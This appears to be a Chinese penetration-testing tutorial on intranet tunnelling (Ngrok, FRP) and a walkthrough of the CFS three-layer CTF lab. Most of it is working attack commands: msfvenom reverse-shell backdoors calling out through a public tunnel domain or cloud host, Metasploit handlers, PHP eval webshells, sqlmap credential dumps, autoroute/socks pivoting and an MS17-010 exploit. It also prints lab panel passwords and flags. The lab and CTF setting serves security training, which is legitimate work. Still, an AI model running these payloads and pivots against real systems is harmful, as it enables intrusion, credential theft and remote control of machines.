# 思维导图

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-0.png)



# 基础知识点

## 1.内外网简单知识

- 内网ip地址是私有ip地址（10/8, 172.16/12 , 192.168/16），除此之外就是外网ip。

## 2.内网1和内网2通信问题

- 两个不同的内网的主机想要通过CS或者MSF等工具实现控制或者通讯是不可能的，必须要借助代理。

## 3.正反向协议通信连接问题

- 正向：<font color='red'>攻击者</font>去连接<font color='blue'>受害者</font>
  - <font color='red'>攻击者</font>处于**内网**，<font color='blue'>受害者</font>处于**外网**
- 反向：<font color='blue'>受害者</font>去连接<font color='blue'>攻击者</font>
  - <font color='red'>攻击者</font>处于**外网**，<font color='blue'>受害者</font>处于**内网**
- 为什么要区分正向和反向？
- 因为如果控制端是外网主机(**103.12.4.11**)，被控端是内网主机（**192.168.23.36**），内网被控端，通过控制端主动去找是找不到的，因为这个内网的IP地址并不是唯一的，可能很多内网都用了这个IP地址，你根本没法找。此时就需要反向连接了，让内网的被控端主动去找外网的控制端。

## 4.内网穿透代理隧道技术说明

- 代理主要解决网络的连通性问题
- 隧道主要解决流量分析工具、流量监控工具、防火墙等相关工具的过滤问题

# 演示案例：

## 1-内网穿透 Ngrok 测试演示-两个内网通讯上线

### 实验拓扑

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-1.png)

### Ngrok

国外：[https://ngrok.com](https://ngrok.com)

国内：[https://www.ngrok.cc/](https://www.ngrok.cc/)

#### 1、注册登录

#### 2、下载相应版本客户端

linux查看系统位数—`uname -m`

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-3.png)

![70-4](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-4.png)

#### 3、开通隧道

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-5.png)

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-6.png)

#### 4、配置本地端口

（虚拟机kali的）

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-7.png)

### 实验开始

协议：http 本地端口：192.168.80.137:4444

测试：内网win7 执行后门—免费主机处理—内网 kali 监听—内网 kali 接受器

```
./sunny clientid 隧道号
msfvenom -p windows/meterpreter/reverse_http lhost=xiaodisec.free.idcfengye.com lport=80 -f exe -o test.exe
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set lhost 192.168.80.137
set lport 4444
exploit
```



#### 1、将Ngrok客户端传到 kali上，启动

```
./sunny clientid 隧道号
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-8.png)

#### 2、msf生成后门

```
msfvenom -p windows/meterpreter/reverse_http lhost=liandy.free.idcfengye.com lport=80 -f exe -o test.exe
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-9.png)

3、配置并监听（一旦liandy.free.idcfengye.com有流量，就发给本地192.168.80.136:4444）

```shell
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set lhost 192.168.80.137
set lport 4444
exploit
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-10.png)

4、在windows7运行test.exe

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-11.png)

一直没出结果，test运行一会儿，进程就停止了。可能需要做免杀，不过无伤大雅！

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-12.png)



- **就是通过外网服务器做个桥梁，双方都能访问到，从而建立连接。**



## 2-内网穿透 Frp 自建跳板测试-两个内网通讯上线

### 实验拓扑图

![70-1](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-1.png)





- FRP说明文档：[https://gofrp.org/docs/examples/](https://gofrp.org/docs/examples/)
- [Release v0.42.0 · fatedier/frp (github.com)](https://github.com/fatedier/frp/releases/tag/v0.42.0)
- Frp工具：开源免费，自行搭建，方便修改，成本低，使用多样化，防止隐私泄露。
- Ngrok工具使用的是别人的服务器，容易泄露隐私数据。









### 1.服务端-下载-解压-修改-启动（**云主机记得修改安全组配置出入口**）

```shell
服务器修改配置文件 frps.ini：
[common]
bind_port = 7000
启动服务端：
./frps -c ./frps.ini
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-14.png)

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-15.png)





### 2.控制端-下载-解压-修改-启动

控制端修改配置文件 frpc.ini：

```shell
[common]
server_addr = 你的云主机 ip
server_port = 7000 #frpc 工作端口，必须和上面 frps 保持一致
[msf]
type = tcp
local_ip = 127.0.0.1
local_port = 5555 #转发给本机的 5555
remote_port = 6000 #服务端用 6000 端口转发给本机
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-13.png)

启动客户端：

```shell
./frpc -c ./frpc.ini
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-16.png)

此时服务端收到端口连接

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-17.png)

### 3、生成后门

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=你的云主机ip lport=6000 -f exe -o frp.exe
```

后面放到靶机运行 frp.exe 即可

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-18.png)

### 4、配置监听

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 5555
exploit
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-19.png)

frp.exe运行后，监听到会话（现在看起来，案例一应该是那个网站的问题，**自己搭建的还是比较靠谱！**）

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-20.png)



## 3-CFS 三层内网漫游安全测试演练-某 CTF 线下 2019

### 实验拓扑图

![70-2](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-2.png)

来源2019某CTF线下赛真题内网结合WEB攻防题库，涉及WEB攻击，内网代理路由等技术，每台服务器存在一个Flag,获取每一个Flag对应一个积分，获取三个Flag结尾。



### 参考：

- https://www.cnblogs.com/zhengna/p/15348419.html
- https://blog.csdn.net/qq_42383069/article/details/123576958
- https://hackergu.com/cfs-network/

### 实验环境搭建

#### 1、靶场下载

CFS三层靶机环境：
链接: https://pan.baidu.com/s/1LJueA-X02K7HZXr8QsOmeg
提取码: dkcp
解压密码：teamssix.com

#### 2、虚拟机配置

设置虚拟机网卡（新建两个仅主机模式的网卡）
VMnet10: 子网IP：192.168.22.0 子网掩码：255.255.255.0
VMnet11: 子网IP：192.168.33.0 子网掩码：255.255.255.0

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-21.png)

配置虚拟机网卡

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-22.png)

虚拟机网卡ip显示

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-23.png)

![70-24](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-24.png)

![70-25](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-25.png)

#### 3、实验拓扑

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-26.png)

#### 4、开放web服务

**开启Web服务：**
宝塔后台登陆地址及密码：

```c
http://靶机外网ip:8888/a768f109/
账号：eaj3yhsl，密码：41bb8fee，根据靶机实际ip，配置即可
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-28.png)

### Target1

##### 信息收集

首先nmap扫描一下192.168.80.1这个网段开放了那些服务。

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-27.png)

##### 漏洞发现

web网站是TP5框架

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-29.png)



Thinkphp5.x工具测试，确认存在漏洞。

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-30.png)

命令执行，打印当前路径

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-31.png)

##### 漏洞利用

通过命令可以直接写入后门（一键功能getshell用不了）

```shell
echo '<?php @eval($_POST[x]);?>' > /www/wwwroot/ThinkPHP/public/shell.php
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-32.png)

访问一下shell.php 验证写入成功！

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-33.png)

##### getshell

蚁剑连接

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-34.png)

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-35.png)

在robots.txt以及flag21sA.txt分别发现flag

```shell
flag{QeaRqaw12fs}  flag{e2D3aFdasde}
```

上传信息收集脚本，进行提权信息收集，进行信息再收集。

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-36.png)

```shell
chmod +x LinEnum.sh
./LinEnum.sh
```

这里运行无回显。具体是什么原因不清楚，大概是权限不够，或者被拦截。那就看一下网络配置。

```
ipconfig
ip addr show 
ip a show dev 网络接口
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-37.png)

这里可以看到有192.168.22.129这个ip。

### 

连接上target1之后，可以用target1当做跳板，但是蚁剑比较麻烦，此时可以改用CS神器或者MSF，因为使用CS或者MSF时，即使权限不够，我们也可以进行一些操作。

接下来我们开始渗透Target2。kali直接与target2连接是连不上的。因为kali网段是80，target2网段是22，二者不在同一个网段，无法互联，但是target1网段是80和22，target1既跟kali同一网段，又跟target2同一网段，因此，我们可以将target1作为跳板，实现kali和target2的互联。

##### 生成后门

```shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.80.137 LPORT=1111 -f elf >t1.elf
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-38.png)

##### 接收反弹

```shell
msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.80.137
set LPORT 1111
exploit
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-39.png)

##### 上传后门、执行后门

通过蚁剑上传后门、执行后门

```shell
chmod +x t1.elf
./t1.elf
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-40.png)

此时接收到会话

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-41.png)

##### 信息收集及配置访问

由于测试环境是我们自己准备的，所以我们知道target2主机的网段及IP地址。但是在实战中，我们应该是未知的，因此我们需要首先进行信息收集，以获得目标target2的相关信息，为进一步的渗透做准备。

##### 获取网络接口

`run get_local_subnets` 

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-42.png)

这里target1存在3个网络接口，一个122、一个80，一个22，80与kali同一网段，是连接外网的，那22就是连接内网（局域网），其实刚才已经收集到这些信息。（122这里不清楚具体是干什么的，可能是前人的配置，毕竟实验环境是在网上找的。）

##### 查看路由地址

`run autoroute -p` 

发现路由表是空的。我们需要添加路由地址

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-43.png)

##### 添加路由地址

`run autoroute -s 192.168.22.0/24`

并且查看路由表，已更新。

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-44.png)

​	添加路由地址成功，说明在刚才反弹的session1会话上，我们添加了一个22网段的网络接口。此时我们就可以通过这个路由跟22网段进行通讯了。虽然能够通讯了，但是我们的目标是攻击target2，要攻击就需要使用到工具，由于路由是写到了msf建立的会话上面，有些工具没法用。此时我们就需要开一个代理，开这个代理就相当于开一个接口给其他人用。

##### 开启本地代理

```shell
use auxiliary/server/socks_proxy
set version 4a
set srvport 2222
exploit
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-45.png)

##### 配置proxychains

找到proxychains.conf文件，linux是/etc/proxychains.conf

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-46.png)

##### nmap进行探针扫描

```shell
proxychains nmap -sT -Pn 192.168.22.0/24
proxychains4 nmap -sT -Pn 192.168.22.0/24 -p80 //这里是为了快速扫描
-Pn：扫描主机检测其是否受到数据包过滤软件或防火墙的保护。
-sT：扫描TCP数据包已建立的连接connect
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-47.png)

发现192.168.22.128:80开放129是target1 的内网ip

```shell
proxychains nmap -sT -Pn 192.168.22.129
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-48.png)

##### 浏览器设置代理

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-49.png)

这里好像原本设置的网站IP不是我设置的192.168.22.129，还需要看一下配置，改一下

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-50.png)

自己搭建实验环境就是意外百出！！！

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-51.png)

```
rm -f /www/server/panel/data/admin_path.pl
192.168.22.128:8888/2cc52ec0
username: xdynr37d
password: 766e248d
```

默认账户密码不顶用，我吐了！又是一番周折，重置了密码。

[Bt(宝塔面板)忘记用户名密码的解决方案 - 走看看 (zoukankan.com)](http://t.zoukankan.com/dadiaomengmei-p-11798735.html)

更改成自己实验环境的ip

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-52.png)

终于能访问了

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-53.png)





### Target2

##### 查看源码

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-54.png)

明确给出SQL注入漏洞点。

```shell
http://192.168.22.128/index.php?r=vul&keyword=1 		#sql注入
```

通过robots.txt文件找到了后台地址（网上查找资料即可补全）

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-55.png)

```shell
http://192.168.22.128/index.php?r=admini/public/login 	#后台
```



##### 爆数据库

通过sqlmap获取账户密码，后台进行登录。

```shell
#爆库名
sqlmap -u "http://192.168.22.128/index.php?r=vul&keyword=1" -p keyword --dbs
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-56.png)

```shell
#爆表名
sqlmap -u "http://192.168.22.128/index.php?r=vul&keyword=1" -p keyword -D bagecms --tables
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-57.png)



```shell
#爆列名
sqlmap -u "http://192.168.22.128/index.php?r=vul&keyword=1" -p keyword -D bagecms -T bage_admin --columns
```

![70-58](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-58.png)



```shell
#脱库
sqlmap -u "http://192.168.22.128/index.php?r=vul&keyword=1" -p keyword -D bagecms -T bage_admin -C username,password --dump
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-59.png)

后台账户密码admin ：123qwe



##### 登录后台

找到flag{eS3sd1IKarw}

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-60.png)

##### 写入shell

找到模板修改处，添加一句话。

```
<?php @eval($_POST[x]);?>  
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-61.png)

```shell
http://192.168.22.128/index.php?r=tag				#后门shell
```

访问

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-62.png)

##### 配置蚁剑代理

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-65.png)

![70-66](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-66.png)

##### 连接后门-拿到webshell

![70-63](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-63.png)

![70-64](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-64.png)

找到flag

flag{23ASfqwr4t2e}

如果攻击机是windows的话，还可以利用代理工具Proxifier或SocksCap64载入代理进行远程访问测试。

##### 生成正向后门

```shell
msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=3333 -f elf > t2.elf
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-67.png)

##### 接收反弹

```shell
use exploit/multi/handler
set payload linux/x64/meterpreter/bind_tcp
set rhost 192.168.22.128
set LPORT 3333
exploit
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-68.png)

##### 上传后门、执行后门

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-69.png)

```shell
chmod +x t2.elf
./t2.elf
```

![70-70](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-70.png)

##### 接收到会话

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-71.png)

##### 信息收集及配置访问

```shell
获取网络接口：run get_local_subnets
查看路由地址：run autoroute -p
添加路由地址：run autoroute -s 192.168.33.0/24
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-72.png)

接下来对3333端口进行攻击，由于目标主机是windows系统，我们以前讲过很多攻击工具，比如，namp --script=all、namp --script=vuln、nessus等

### Target3

探针目标-端口及漏洞扫描-利用MS17010获取系统权限-获取Flag-GG

##### 探针检测

探针目标，发现开放了445和3389端口，且存在MS17010漏洞。(永恒之蓝)

```shell
proxychains4 nmap -Pn -sT 192.168.33.33
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-73.png)

##### 漏洞利用

利用MS17010获取系统权限

```shell
use exploit/windows/smb/ms17_010_psexec
set payload windows/meterpreter/bind_tcp
set RHOST 192.168.33.33
exploit
```

监听到会话，得到system权限。

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-74.png)

搜索关键字，得到第3个flag

```shell
shell
dir /S flag.txt /B
type C:\Users\Administrator\Desktop\flag.txt
```

![](https://typora-1310579726.cos.ap-shanghai.myqcloud.com/images/70-75.png)



# 涉及资源

[ngrok - Online in One Line](https://ngrok.com/)

[Sunny-Ngrok内网转发内网穿透 - 国内内网映射服务器](https://www.ngrok.cc/)

[frp多层socks代理+端口映射_PANDA-墨森的博客-CSDN博客_frp多层代理](https://blog.csdn.net/weixin_45447309/article/details/106697369)

[FRP 内网穿透 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/184855)

[Linux安装proxychains](https://www.cnblogs.com/xuyaowen/p/ProxyChians4.html)

[nps 的使用 | TeamsSix](https://teamssix.com/210612-213704.html)

[ehang-io/nps: 一款轻量级、高性能、功能强大的内网穿透代理服务器](https://github.com/ehang-io/nps)
